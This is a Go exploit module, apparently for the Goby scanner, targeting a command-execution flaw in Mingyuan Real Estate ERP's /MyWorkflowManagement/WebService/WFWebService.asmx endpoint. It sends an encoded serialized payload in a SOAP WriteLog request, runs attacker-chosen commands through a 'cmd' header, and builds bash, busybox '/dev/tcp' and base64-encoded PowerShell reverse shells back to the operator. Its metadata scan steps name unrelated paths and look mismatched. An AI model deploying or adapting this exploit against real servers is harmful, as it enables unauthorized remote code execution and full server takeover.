package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Ming yuan Real Estate ERP /MyWorkflowManagement/WebService/WFWebService.asmx Command Execution Vulnerability",
    "Description": "<p>Mingyuan Real Estate ERP is an enterprise resource planning (ERP) system designed specifically for the real estate industry. The system integrates multiple modules such as project management, financial management, customer relationship management, and marketing management, aiming to help real estate companies improve operational efficiency, reduce costs, and increase customer satisfaction. It fully considers the characteristics and needs of the real estate industry, and realizes unified information management and efficient collaboration by integrating various business links of the enterprise.</p>",
    "Product": "Mingyuan-Yun-ERP",
    "Homepage": "https://www.mingyuanyun.com/solutions/real-estate-development/erp",
    "DisclosureDate": "2024-11-04",
    "PostTime": "2024-11-04",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"明源地产ERP\" && body!=\"书签管理程序\"",
    "GobyQuery": "body=\"明源地产ERP\" && body!=\"书签管理程序\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily executecode on the server side, write backdoors, obtain serverpermissions, and then control the entire server.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit the public from accessing the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/143479322?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByPowershell,ByPowershellBase64",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/tools_command.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "cmb_header=&txt_command=pwd"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "明源地产ERP /MyWorkflowManagement/WebService/WFWebService.asmx 命令执行漏洞",
            "Product": "明源地产ERP",
            "Description": "<p>明源地产ERP是一款专为房地产行业设计的企业资源规划（ERP）系统，系统集成了项目管理、财务管理、客户关系管理、营销管理等多个模块，旨在帮助房地产企业提升运营效率、降低成本和提高客户满意度。它充分考虑了房地产行业的特性和需求，通过整合企业的各个业务环节，实现信息的统一管理和高效协同。<br></p>",
            "Recommendation": "<p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;&nbsp;<br></p><p>2、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Ming yuan Real Estate ERP /MyWorkflowManagement/WebService/WFWebService.asmx Command Execution Vulnerability",
            "Product": "Mingyuan-Yun-ERP",
            "Description": "<p>Mingyuan Real Estate ERP is an enterprise resource planning (ERP) system designed specifically for the real estate industry. The system integrates multiple modules such as project management, financial management, customer relationship management, and marketing management, aiming to help real estate companies improve operational efficiency, reduce costs, and increase customer satisfaction. It fully considers the characteristics and needs of the real estate industry, and realizes unified information management and efficient collaboration by integrating various business links of the enterprise.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.<br></p><p>2. If not necessary, prohibit the public from accessing the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily executecode on the server side, write backdoors, obtain serverpermissions, and then control the entire server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`
	setPayloadRequestHashQgLPm6r9 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		//漏洞url地址
		vulPath := "/MyWorkflowManagement/WebService/WFWebService.asmx"
		postRequestConfig := httpclient.NewPostRequestConfig(vulPath)
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Data = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soap:Body>\n      <WriteLog xmlns=\"http://tempuri.org/\">\n        <request>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</request>\n      </WriteLog>\n    </soap:Body>\n  </soap:Envelope>"

		//请求头
		head := map[string]string{
			"Content-Type": "text/xml; charset=utf-8",
			"SOAPAction":   "http://tempuri.org/WriteLog",
			"cmd":          command,
		}
		for headName, headValue := range head {
			postRequestConfig.Header.Store(headName, headValue)
		}

		//请求
		response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil || response == nil || response.StatusCode != 200 {
			return "", "", errors.New("RCE Fail")
		}

		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := response.RawBody

		return commandResult, vulPath, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgLPm6r9

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},

		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgLPm6r9

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			ReverseTcpByBusyBox := func(rp string) string {
				return fmt.Sprintf("busybox sh -c 'sh -i >& /dev/tcp/%s/%s 0>&1'", godclient.GetGodServerIP(), rp)
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByBusyBox":          ReverseTcpByBusyBox,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
